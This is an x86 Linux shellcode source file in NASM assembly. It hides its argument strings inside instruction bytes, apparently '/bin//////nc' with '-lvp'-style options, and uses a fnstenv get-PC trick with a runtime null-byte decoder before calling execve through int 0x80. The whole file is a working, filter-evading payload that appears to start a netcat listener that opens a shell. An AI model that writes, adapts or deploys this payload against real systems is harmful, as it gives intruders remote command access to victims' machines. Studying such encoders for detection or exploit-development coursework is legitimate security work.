
global _start

section .text
_start:

xor eax,eax

mov al, 0x8
fnop
jmp short argParser

sub    eax,0x33317076
xor    esi,DWORD [edi]
aaa
nop

lea edx, [esi+4]

mov al, 0xc
fnop
jmp short argParser

sub   eax,0x6576766c    ; \xe8\x0e\x00\x00\x00
das
bound  ebp, [ecx+0x6e]
das
jae $+0x6a
nop


lea ecx, [esi+4]

;call $ + 0x12   ;\xe8\x0d\x00\x00\x00

mov al, 0xc
fnop
jmp short argParser

das
bound  ebp, [ecx+0x6e]
das
das
das
das
das
das
outsb
arpl word [eax],bx

lea ebx, [esi+4]

push eax
push edx
push ecx
push ebx

;mov eax, 0x454e4a2f
;add ax, 0x1000

cdq
mov  ecx,esp
;and eax,0x3a31358b
mov al, 0xb
int 0x80

argParser: ; similar to jmp-call-oppop but calls to a nop byte which can
                    ; assmuming al has the right distance
    fnstenv [esp-0xc]
    pop esi
    mov byte [esi + 0x4 + eax], ah ; null-byte decoder
    lea edi, [esi + 0x4+eax+0x1]
    xor eax,eax
    jmp edi
